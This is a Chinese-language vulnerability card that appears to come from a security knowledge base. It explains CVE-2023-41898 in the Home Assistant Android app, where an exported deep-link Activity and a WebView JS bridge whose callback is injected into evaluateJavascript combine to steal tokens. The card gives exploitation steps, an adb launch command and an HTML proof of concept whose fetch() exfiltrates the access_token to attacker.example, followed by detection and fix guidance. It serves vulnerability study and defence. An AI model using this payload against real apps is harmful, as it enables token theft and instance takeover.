---
id: mobile-android-exported-deeplink-webview-externalauth-callback-xss
title: Android 导出深链 Activity 加载任意 URL：homeassistant://navigate 进入 WebView，externalApp.getExternalAuth 的 callback 被拼进 evaluateJavascript 窃取令牌
type: scenario
domain: mobile
path: mobile/android
technique: android-deeplink-webview-js-callback-injection
aliases:
- WebView 任意 URL 加载
- exported MyActivity
- homeassistant://navigate
- externalApp.getExternalAuth
- evaluateJavascript 注入
- CVE-2023-41898
- Home Assistant Android
tags:
- android
- webview
- deeplink
- exported-activity
- javascriptinterface
- xss
- token-theft
- home-assistant
cve:
- CVE-2023-41898
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: 2023.9.2 之前（Android Companion；原文：修复在 2023.9.2 发布；CVE-2023-41898）
verification:
  verified_by: verifier-V543
  verified_at: '2026-11-11T20:33:24+08:00'
  notes: 已对照原文第十节与图08核对：manifest exported MyActivity(https://my.home-assistant.io/redirect/)、intent.data 加 mobile=1 载入启用 JS 的 WebView、shouldOverrideUrlLoading 处理 homeassistant://navigate/、WebViewActivity→UrlUtil.handle 放行绝对 URL、externalApp.getExternalAuth 将 callback 拼入 evaluateJavascript，PoC 与 adb 命令均一致；CVE-2023-41898、修复 2023.9.2（原文时间线2023-09-10），affected_versions 正确。属同一 CVE 的完整利用链，原子；与 JSBridge 任意 origin 卡入口与 sink 均不同。未执行 PoC。
---

## 一句话结论

Android 伴侣应用导出的 `MyActivity` 接收 `https://my.home-assistant.io/redirect/...` 深链并把 URI 加载进开启 JavaScript 的 WebView；页面里的 `homeassistant://navigate/<path>` 会被转交给 `WebViewActivity` 加载任意绝对 URL，而 JS 接口 `externalApp.getExternalAuth` 把 payload 里的 `callback` 字符串拼进 `evaluateJavascript`，攻击者可注入 JS，读取桥返回的 access_token 并外带。

## 原理

- Android manifest 中 `MyActivity` 为 `android:exported="true"`，注册了浏览器可调起的 VIEW/BROWSABLE 深链（`https://my.home-assistant.io/redirect/`）。同设备任意应用都可发送 Intent 拉起它。
- `MyActivity` 从 `intent.data` 取 URI，追加 `mobile=1` 后用 `webview.loadUrl(newUri)` 加载；WebView 设置 `javaScriptEnabled=true`，并覆写 `shouldOverrideUrlLoading`：URL 以 `homeassistant://navigate/` 开头时，去掉前缀，把剩余部分作为 `path` 传给 `WebViewActivity`。
- `WebViewActivity` 把 `path` 交给 presenter 加载；`UrlUtil.handle(base, input)` 的 `isAbsoluteUrl` 用 `^https?://` 判断，绝对 URL 原样返回。于是攻击者页面可以先跳 `homeassistant://navigate/https://attacker.example/exploit`，让特权 WebView 加载任意站点。
- WebView 通过 `@JavascriptInterface fun getExternalAuth(payload)` 暴露原生能力：解析 payload 的 `callback`，`onGetExternalAuth` 把它拼成 `setExternalAuth("$callback(true, <用户外部认证令牌 JSON>)")`，最后 `webView.evaluateJavascript(script, null)` 执行。`callback` 由页面完全控制，等价于在应用上下文里执行任意 JS（XSS）。
- 攻击者注入的 `callback`（如 `function func(a,b){alert(b.access_token);};func`）会被调用时收到第二个参数——应用从认证仓库取出的外部认证令牌（access_token），于是令牌被读出并通过网络请求外带。
- 之所以成立：深链入口未把加载目标限制在 `my.home-assistant.io`；`homeassistant://navigate` 允许绝对 URL；WebView 内 JS 桥把“回调函数名”当成代码拼接执行，没有校验/序列化。

## 触发条件

- 应用导出了可被外部拉起的 Activity/深链，且其参数能控制 WebView 加载的 URL。
- WebView 开启 JavaScript，且允许加载任意 http/https 页面（未做域名白名单）。
- 应用注册了接受字符串 callback 并 `evaluateJavascript` 的 JS 接口，桥返回敏感数据（令牌/用户信息）。
- 攻击者能诱使受害者打开深链（恶意 App 直接 Intent、短信/网页/二维码）或在本机安装恶意应用。
- 目标 App 版本受影响（本案例为 2023.9.2 之前）。

## 利用步骤

1. 反编译/抓包确认 manifest 中 exported 的深链 Activity 与其 data scheme/host。
2. 分析 `shouldOverrideUrlLoading` 与 URL 处理逻辑，确认存在 `homeassistant://navigate/` 之类的内部跳转可加载绝对 URL。
3. 枚举 WebView 的 `@JavascriptInterface`，找把字符串拼进 `evaluateJavascript` 的方法（如 `getExternalAuth(callback)`）。
4. 搭建攻击者页面：加载后跳转 `homeassistant://navigate/<绝对URL>`，或直接构造带注入 `callback` 的 `externalApp.getExternalAuth(...)` 调用。
5. 投递：`adb shell am start -n <pkg>/<Activity> -d '<深链>' -a android.intent.action.VIEW`；真实场景用网页/二维码/恶意 App。
6. 在攻击者服务器收取令牌，调用 API 验证并接管实例。

## PoC

```bash
# 1) 通过导出的 MyActivity 拉起，加载攻击者页面
adb shell am start -n io.homeassistant.companion.android.debug/io.homeassistant.companion.android.launch.my.MyActivity \
  -d '"https://attacker.example/exploit"' -a android.intent.action.VIEW
```

```html
<!-- 2) 攻击者页面：跳到内部 navigate 协议，并注入 getExternalAuth 的 callback -->
<html><body>
<script>
document.location = "homeassistant://navigate/entityId:\"}}));externalApp.getExternalAuth('{\"callback\": \"function func(a,b){alert(b.access_token);fetch('https://attacker.example/collect?t='+encodeURIComponent(b.access_token));};func\", \"force\": \"true\"}');//";
</script>
</body></html>
```

```text
# 预期：被注入的 callback 在 evaluateJavascript 中执行，
# 第二个参数是应用取出的外部认证令牌，令牌被 alert/外带到攻击者服务器。
```

## 变体与关联

- 变体：导出 Activity 直接接受 `url`/`link` 参数；或通过自定义 scheme + 路由组件间接触发 WebView 加载。
- 变体：JS 接口不只 `getExternalAuth`，任何“字符串回调名 + evaluateJavascript/loadUrl(javascript:) ”的组合都可注入。
- 变体：若不能注入 JS，仍可利用任意 URL 加载配合桥的全局 handler 直接读取敏感数据（参考同类 JSBridge 卡）。
- 关联：[[mobile-android-webview-jsbridge-arbitrary-origin-credential-theft]]（任意 origin 加载 + 全局 handler 窃取凭证）、[[mobile-android-intent-redirect-webview-cookie-stored-xss-file-symlink]]（Intent 重定向 + WebView XSS）、[[mobile-ios-url-scheme-universal-link-service-csrf]]（同一产品的 iOS 深链问题）。
- 边界：WebView 仅允许白名单域名、导出组件校验 scheme/host、`navigate` 只接受相对路径、JS 回调名做正则白名单或改为结构化数据时，本场景不成立。

## 检测与防御

- 检测：Manifest 中 exported + BROWSABLE 深链；WebView 加载外部域名；`evaluateJavascript` 的脚本包含来自页面/Intent 的字符串；JS 接口回调参数未校验；应用出现异常外部认证/令牌使用。
- 修复：深链入口校验 host/path（只允许 `my.home-assistant.io`），加载前校验目标 URL 与实例同源；`homeassistant://navigate` 仅接受预期格式的实体 ID，禁止绝对 URL；JS 接口不要拼接执行调用方提供的代码字符串。
- 加固：WebView 关闭不必要的 JS/文件访问；对桥方法做参数白名单与序列化；导出组件加签名权限或改为 `exported=false`；对敏感令牌使用短时效、设备绑定。
